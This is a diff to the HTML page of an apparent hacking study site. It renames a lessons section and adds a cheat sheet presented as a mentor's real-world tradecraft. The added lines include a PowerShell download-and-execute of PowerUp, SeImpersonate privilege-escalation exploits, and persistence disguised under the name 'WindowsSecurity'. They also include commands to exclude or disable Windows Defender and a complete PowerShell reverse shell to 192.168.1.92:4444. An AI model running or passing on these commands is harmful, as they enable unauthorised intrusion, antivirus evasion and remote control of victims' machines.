@@ -35,12 +35,15 @@ body{background:var(--bg);color:var(--fg);font-family:'Inter',sans-serif;line-he
 .resource-list{list-style:none;}
 .resource-list li{border-bottom:1px solid var(--border);padding:0.8rem 0;}
 .resource-list li:last-child{border-bottom:none;}
-.resource-list a{color:var(--neon);text-decoration:none;font-family:'Space Mono',monospace;font-size:0.8rem;}
+.resource-list a{font-family:'Space Mono',monospace;color:var(--neon);text-decoration:none;}
 .resource-list a:hover{text-decoration:underline;}
-.resource-list .desc{font-size:0.7rem;color:var(--dim);margin-top:0.2rem;}
-.note{border:1px solid var(--green-dim);padding:1rem;background:rgba(0,255,65,0.05);margin:1rem 0;font-size:0.8rem;color:var(--green-dim);}
-.note::before{content:'// NOTE: ';color:var(--green);font-weight:700;}
-.footer{margin-top:4rem;padding-top:2rem;border-top:2px solid var(--border);text-align:center;font-family:'Space Mono',monospace;font-size:0.7rem;color:var(--dim);}
+.resource-list .desc{font-size:0.8rem;color:var(--dim);margin-top:0.3rem;}
+    
+.code-block{background:var(--bg3);border:1px solid var(--border);padding:1rem;margin:1rem 0;font-family:'Space Mono',monospace;font-size:0.75rem;color:var(--fg);overflow-x:auto;white-space:pre-wrap;word-break:break-all;}
+    .note{background:rgba(255,170,0,0.05);border-left:3px solid var(--amber);padding:1rem;margin:1rem 0;font-size:0.85rem;color:var(--fg);}
+    h3{font-family:'Space Mono',monospace;font-size:0.9rem;color:var(--accent);margin:1.5rem 0 0.5rem;text-transform:uppercase;letter-spacing:0.05em;}
+    .note::before{content:'// NOTE: ';color:var(--amber);font-weight:700;}
+    .footer{margin-top:4rem;padding-top:2rem;border-top:2px solid var(--border);text-align:center;font-family:'Space Mono',monospace;font-size:0.7rem;color:var(--dim);}
 </style>
 </head>
 <body>
@@ -54,7 +57,7 @@ body{background:var(--bg);color:var(--fg);font-family:'Inter',sans-serif;line-he
 <div class="nav">
   <a href="index.html">← HOME</a>
   <a href="#modules">MODULES</a>
-  <a href="#asi-lessons">ASI DEV LESSONS</a>
+  <a href="#mentor">MENTOR LESSONS</a>
   <a href="#tools">TOOLS</a>
   <a href="#quick-ref">QUICK REF</a>
 </div>
@@ -277,8 +280,8 @@ body{background:var(--bg);color:var(--fg);font-family:'Inter',sans-serif;line-he
 </div>
 
 <!-- ASI DEV LESSONS SECTION -->
-<div class="section" id="asi-lessons">
-  <div class="section-number">// ASI DEV LESSONS</div>
+<div class="section" id="mentor">
+  <div class="section-number">// MENTOR LESSONS</div>
   <h2>SUPPLEMENTARY MATERIAL — FROM THE FIELD</h2>
   
   <div class="note">These documents are compiled from operational conversations with experienced practitioners. They represent real-world tradecraft, not sanitized theory.</div>
@@ -307,6 +310,14 @@ body{background:var(--bg);color:var(--fg);font-family:'Inter',sans-serif;line-he
     <li>
       <a href="https://github.com/rainfantry/lessons-from-teacher/blob/master/PRIVESC_LADDER.md" target="_blank">PRIVESC_LADDER.md</a>
       <div class="desc">User → Admin → System kill chain with persistence at each level. "Save every rung."</div>
+    </li>
+    <li>
+      <a href="https://github.com/rainfantry/lessons-from-teacher/blob/master/KILL_CHAIN_LAB_EVIDENCE.md" target="_blank">KILL_CHAIN_LAB_EVIDENCE.md</a>
+      <div class="desc">Live lab test results from WUPC .42 — SSH, privileges, service hijacking, persistence verification.</div>
+    </li>
+    <li>
+      <a href="https://github.com/rainfantry/lessons-from-teacher/blob/master/SERVITOR_ASSESSMENT.md" target="_blank">SERVITOR_ASSESSMENT.md</a>
+      <div class="desc">Chain reality — why published exploits die, 0day path, honest tool status. "One link is a rope. A chain is a noose."</div>
     </li>
   </ul>
 </div>
@@ -347,6 +358,76 @@ body{background:var(--bg);color:var(--fg);font-family:'Inter',sans-serif;line-he
   <div class="section-number">// QUICK REFERENCE</div>
   <h2>CHEAT SHEETS & ONE-LINERS</h2>
 
+  <div class="note">The mentor: "You should have your notes organized with commands, you shouldn't memorize." These are the commands you need, organized by category.</div>
+
+  <h3>RECON — KNOW THE TARGET</h3>
+  <pre class="code-block"># Who am I and what can I do?
+whoami
+whoami /groups
+whoami /priv
+
+# What's this machine?
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+hostname
+
+# What's running?
+tasklist /svc
+netstat -ano
+
+# What's the network?
+ipconfig /all
+route print
+
+# What services exist?
+sc query | findstr SERVICE_NAME
+sc qc <service_name>  # Check service config, look for weak permissions</pre>
+
+  <h3>PRIVESC — CLIMB THE LADDER</h3>
+  <pre class="code-block"># Automated enumeration (run these first)
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
+
+# Check for weak services
+sc qc <service_name>
+accesschk.exe -uwcqv "Authenticated Users" *
+
+# Exploit SeImpersonatePrivilege
+PrintSpoofer.exe -i -c cmd
+RoguePotato.exe -r 127.0.0.1 -e "cmd.exe" -l 9999</pre>
+
+  <h3>PERSISTENCE — SAVE EVERY RUNG</h3>
+  <pre class="code-block"># User-level: Registry Run key
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSecurity /t REG_SZ /d "C:\path\payload.exe" /f
+
+# Admin-level: Scheduled task
+schtasks /create /tn "WindowsSecurity" /tr "C:\path\payload.exe" /sc onlogon /ru SYSTEM
+
+# System-level: Service
+sc create WindowsSecurity binPath= "C:\path\payload.exe" start= auto
+
+# The mentor's favorite: SSH server (legitimate, hard to detect)
+Add-WindowsCapability -Online -Name OpenSSH.Server
+Start-Service sshd
+Set-Service -Name sshd -StartupType Automatic</pre>
+
+  <h3>DEFENDER — BYPASS OR DISABLE</h3>
+  <pre class="code-block"># Silent: Add exclusion (works with Tamper Protection ON)
+Add-MpPreference -ExclusionPath "C:\path\to\your\folder"
+
+# Moderate: Disable real-time monitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Nuclear: Uninstall Defender (requires reboot, very noisy)
+# DON'T do this unless you have no other choice</pre>
+
+  <h3>C2 — REVERSE SHELL</h3>
+  <pre class="code-block"># Start listener (attacker machine)
+nc -lvnp 4444
+
+# Connect back (victim machine)
+powershell -c "$c=New-Object Net.Sockets.TCPClient('192.168.1.92',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$e=([Text.Encoding]::ASCII).GetBytes($o2);$s.Write($e,0,$e.Length)}"
+
+# The mentor: "Reverse shell is the basic for everything."</pre>
+
   <ul class="resource-list">
     <li>
       <a href="https://github.com/rainfantry/lessons-from-teacher/blob/master/QUICK_CHEAT_SHEET.md" target="_blank">Windows Recon One-Liners</a>
@@ -354,11 +435,11 @@ body{background:var(--bg);color:var(--fg);font-family:'Inter',sans-serif;line-he
     </li>
     <li>
       <a href="https://github.com/rainfantry/lessons-from-teacher/blob/master/DEFENDER_MANAGEMENT.md" target="_blank">Defender Management</a>
-      <div class="desc">Check exclusions, disable real-time monitoring, delete Defender files, clear logs.</div>
+      <div class="desc">Exclusions, disabling, destructive removal, cleanup. The full spectrum.</div>
     </li>
     <li>
       <a href="https://github.com/rainfantry/lessons-from-teacher/blob/master/SYSTEM_SETTINGS.md" target="_blank">System Settings</a>
-      <div class="desc">PowerShell execution policies, Explorer view settings, Defender threat checks.</div>
+      <div class="desc">PowerShell policies, Explorer settings, Defender checks. Configuration for operations.</div>
     </li>
     <li>
       <a href="https://github.com/rainfantry/lessons-from-teacher/blob/master/PRIVESC_LADDER.md" target="_blank">Privilege Escalation Ladder</a>
